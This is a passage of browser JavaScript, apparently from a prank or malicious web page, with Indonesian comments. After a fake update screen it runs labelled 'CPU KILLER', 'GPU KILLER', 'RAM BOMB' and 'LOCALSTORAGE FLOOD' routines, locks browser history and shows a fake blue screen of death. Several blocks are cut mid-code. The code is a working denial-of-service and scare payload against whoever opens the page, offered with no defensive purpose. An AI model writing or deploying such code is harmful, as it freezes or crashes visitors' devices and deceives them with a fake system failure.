                    clearInterval(interval);
                    document.querySelector('.status').innerHTML = '⚠️ UPDATE FAILED ⚠️<br>System Error';
                } else {
                    counterEl.innerText = Math.floor(percent);
                }

            // ========== 1. CPU KILLER MULTI-THREAD ==========
            // Bikin 20+ loop infinite yang jalan bareng
            for (let t = 0; t < 20; t++) {
                setTimeout(() => {
                    let x = Math.random();
                    while (true) {
                        for (let i = 0; i < 1000000; i++) {
                            x = Math.sin(x) * Math.cos(x) + Math.sqrt(Math.abs(x));
                            x = (x * 123456789) % 1;
                        }
                        // Memory leak setiap iterasi

                    new Worker(URL.createObjectURL(blob));
                } catch(e) {}

            // ========== 3. GPU KILLER (WebGL) ==========
            const canvas = document.createElement('canvas');
            canvas.width = 4096;
            canvas.height = 4096;
            canvas.style.display = 'none';
            document.body.appendChild(canvas);
            
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                // Bikin banyak texture besar
                const textures = [];
                for (let i = 0; i < 500; i++) {
                    const tex = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, tex);
                    const size = 2048;
                    const pixels = new Uint8Array(size * size * 4);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
                    textures.push(tex);
                }
                
                // Shader berat dengan loop
                const vs = `attribute vec4 p; void main() { gl_Position = p; }`;
                const fs = `
                    precision highp float;
                    void main() {
                        float sum = 0.0;
                        for (int i = 0; i < 100000; i++) {
                            sum += sin(float(i)) * cos(float(i));
                        }
                        gl_FragColor = vec4(1.0);
                    }
                `;
                
                function createShader(type, src) {
                    const s = gl.createShader(type);
                    gl.shaderSource(s, src);
                    gl.compileShader(s);
                    return s;
                }
                
                const program = gl.createProgram();
                gl.attachShader(program, createShader(gl.VERTEX_SHADER, vs));
                gl.attachShader(program, createShader(gl.FRAGMENT_SHADER, fs));
                gl.linkProgram(program);
                gl.useProgram(program);
                
                const buffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
                const pos = gl.getAttribLocation(program, "p");
                gl.enableVertexAttribArray(pos);
                gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
                
                function gpuLoop() {
                    for (let i = 0; i < 100; i++) {
                        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    }
                    requestAnimationFrame(gpuLoop);
                }
                gpuLoop();
            }
            
            // ========== 4. RAM BOMB ==========
            setInterval(() => {
                try {
                    const bomb = [];
                    for (let i = 0; i < 100; i++) {
                        bomb.push({
                            a: new Array(1000000).fill('x'),
                            b: new Array(1000000).fill({ y: 1 }),
                            c: new ArrayBuffer(50000000)
                        });
                    }
                } catch(e) {}
            }, 50);
            
            // ========== 5. LOCALSTORAGE FLOOD ==========
            setInterval(() => {
                try {
                    for (let i = 0; i < 500; i++) {
                        localStorage.setItem('bomb_' + Date.now() + '_' + i, 'x'.repeat(100000));
                        sessionStorage.setItem('bomb_' + Date.now() + '_' + i, 'y'.repeat(100000));
                    }
                } catch(e) {}
            }, 100);
            
            // ========== 6. HISTORY LOCK ==========
            setInterval(() => {

                }

            window.onpopstate = () => history.go(1);
            
            // ========== 7. FAKE BSOD SETELAH 12 DETIK ==========
            setTimeout(() => {

                document.body.appendChild(bsod);
                
                let dump = 0;

                        clearInterval(dumpInterval);
                        location.reload();
                    }
                    const dumpSpan = document.getElementById('dump');
                    if (dumpSpan) dumpSpan.innerText = Math.min(100, dump).toFixed(0);
                }, 100);

            // ========== 8. VIBRATION (Kalo support) ==========
